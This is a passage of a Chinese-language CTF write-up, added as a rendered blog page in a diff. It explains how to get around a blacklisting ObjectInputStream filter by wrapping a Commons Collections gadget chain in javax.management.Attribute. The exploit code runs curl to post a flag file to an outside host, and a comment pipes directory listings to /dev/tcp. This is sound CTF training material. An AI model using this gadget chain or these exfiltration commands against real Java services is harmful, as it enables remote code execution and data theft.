+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">SafeInputStream</span> <span class="kd">extends</span> <span class="n">ObjectInputStream</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">boolean</span> <span class="n">entry</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">final</span> <span class="kd">static</span> <span class="n">String</span><span class="o">[]</span> <span class="n">blackList</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;java.util.Hashtable&#34;</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;java.util.HashSet&#34;</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;java.util.HashMap&#34;</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;javax.management.BadAttributeValueExpException&#34;</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;java.util.PriorityQueue&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">SafeInputStream</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">in</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">entry</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">resolveClass</span><span class="o">(</span><span class="n">ObjectStreamClass</span> <span class="n">desc</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">entry</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">entry</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="n">blackList</span><span class="o">).</span><span class="na">contains</span><span class="o">(</span><span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">())</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Set&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;List&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Map&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Tree&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Font&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Support&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Collection&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Impl&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Bag&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">!</span><span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;javax&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">ClassNotFoundException</span><span class="o">(</span><span class="s">&#34;Cannot deserializ &#34;</span> <span class="o">+</span> <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">resolveClass</span><span class="o">(</span><span class="n">desc</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">resolveClass</span><span class="o">(</span><span class="n">desc</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>相比于上一题，就是限制了第一轮的 <code>resolveClass()</code> 的类必须在 <code>javax</code> 包下，第一时间想到了 <code>BadAttributeValueExpException</code>  ,但是这个类已经在黑名单中了，之后在 <code>javax.management</code> 包下面找到了 <code>Attribute</code> 类：</p>
+<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20220227213448256.png" alt="image-20220227213448256"></p>
+<p>同样可以携带Object类型的属性，且可以被序列化，所以直接构造序列化数据：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;getMethod&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;getRuntime&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="n">0</span><span class="o">]}),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;invoke&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">0</span><span class="o">]}),</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// 先命令外带列目录 ls / | base64 &gt; /dev/tcp/127.0.0.1/23333
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;curl&#34;</span><span class="o">,</span> <span class="s">&#34;-d&#34;</span><span class="o">,</span> <span class="s">&#34;@/this_1s_f1ag.txt&#34;</span><span class="o">,</span><span class="s">&#34;http://IP:PORT/Foo/&#34;</span><span class="o">}}),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">1</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="o">};</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Transformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Map</span> <span class="n">innerMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Map</span> <span class="n">outerMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">outerMap</span><span class="o">,</span> <span class="s">&#34;111&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">expMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">expMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;222&#34;</span><span class="o">,</span> <span class="n">tiedMapEntry</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.commons.collections.bidimap.DualHashBidiMap&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">BidiMap</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">dualHashBidiMap</span> <span class="o">=</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">expMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Attribute</span> <span class="n">attribute</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Attribute</span><span class="o">(</span><span class="s">&#34;foo&#34;</span><span class="o">,</span> <span class="n">dualHashBidiMap</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">baos</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">attribute</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">encode</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BASE64Encoder</span><span class="o">().</span><span class="na">encode</span><span class="o">(</span><span class="n">baos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()).</span><span class="na">replace</span><span class="o">(</span><span class="s">&#34;\n&#34;</span><span class="o">,</span> <span class="s">&#34;&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">encode</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="n">URLEncoder</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">encode</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">StringSelection</span> <span class="n">selection</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringSelection</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Clipboard</span> <span class="n">clipboard</span> <span class="o">=</span> <span class="n">Toolkit</span><span class="o">.</span><span class="na">getDefaultToolkit</span><span class="o">().</span><span class="na">getSystemClipboard</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clipboard</span><span class="o">.</span><span class="na">setContents</span><span class="o">(</span><span class="n">selection</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+</span></span></span><span class="line"><span class="cl"><span class="c1">//        ObjectInputStream objectInputStream = new SafeInputStream(bais);
+</span></span></span><span class="line"><span class="cl"><span class="c1">//        objectInputStream.readObject();
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用方式同上一题。</p>
+
+    </div>
+
+    
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/cs143-compiler/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">CS143-Compiler</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:marszs.jin@foxmail.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/Marszs" class="iconfont icon-github" title="github"></a>
+  <a href="http://localhost:1313/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span></span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
